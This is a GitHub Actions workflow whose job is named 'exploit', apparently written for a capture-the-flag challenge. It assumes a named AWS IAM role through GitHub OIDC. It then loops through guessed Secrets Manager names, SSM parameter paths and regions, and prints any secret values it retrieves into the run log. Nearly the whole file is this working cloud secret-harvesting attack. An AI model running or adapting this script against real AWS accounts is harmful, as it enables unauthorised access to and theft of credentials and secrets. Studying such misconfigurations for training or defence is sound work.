name: FINAL SECRET HUNT - Multiple Patterns

on:
  workflow_dispatch:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Assume GitHub Deployment Role
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
        aws-region: us-west-1
        role-session-name: FinalHunt
        role-external-id: "internal/secrets/id-v2"
        
    - name: Hunt for Flag Using Different Approaches
      run: |
        echo "🎯 FINAL FLAG HUNT STARTING..."
        
        # Approach 1: Try the external ID as secret name with various suffixes
        echo "=== APPROACH 1: ExtID with AWS random suffixes ==="
        for suffix in $(echo "AbCdEf 123456 aBc123 XyZ789 qWeRtY" | tr ' ' '\n'); do
          secret="internal/secrets/id-v2-$suffix"
          echo "Trying: $secret"
          result=$(aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 2>/dev/null)
          if [ $? -eq 0 ]; then
            echo "🎉 SUCCESS: $secret"
            echo "$result"
          fi
        done
        
        # Approach 2: Try different versions 
        echo "=== APPROACH 2: Different versions ==="
        for version in "id-v1" "id-v3" "id-v4" "flag-v2" "creds-v2"; do
          secret="internal/secrets/$version"
          echo "Trying: $secret"
          result=$(aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 2>/dev/null)
          if [ $? -eq 0 ]; then
            echo "🎉 SUCCESS: $secret"
            echo "$result"
          fi
        done
        
        # Approach 3: Try as SSM Parameter
        echo "=== APPROACH 3: SSM Parameter Store ==="
        for param in "/internal/secrets/id-v2" "/hexnova404/flag" "/github/deployment/flag" "/ctf/flag"; do
          echo "Trying SSM: $param"
          result=$(aws ssm get-parameter --name "$param" --with-decryption --region us-west-1 2>/dev/null)
          if [ $? -eq 0 ]; then
            echo "🎉 SSM SUCCESS: $param"
            echo "$result"
          fi
        done
        
        # Approach 4: Try different regions for the same secret
        echo "=== APPROACH 4: Different regions ==="
        for region in "us-east-1" "us-east-2" "us-west-2"; do
          echo "Trying region: $region"
          result=$(aws secretsmanager get-secret-value --secret-id "internal/secrets/id-v2" --region "$region" 2>/dev/null)
          if [ $? -eq 0 ]; then
            echo "🎉 SUCCESS in $region"
            echo "$result"
          fi
        done
        
        # Approach 5: Check if we can describe the secret without reading it
        echo "=== APPROACH 5: Describe secrets ==="
        aws secretsmanager describe-secret --secret-id "internal/secrets/id-v2" --region us-west-1 2>/dev/null || echo "Describe failed"
        
        echo "🏁 FINAL HUNT COMPLETE"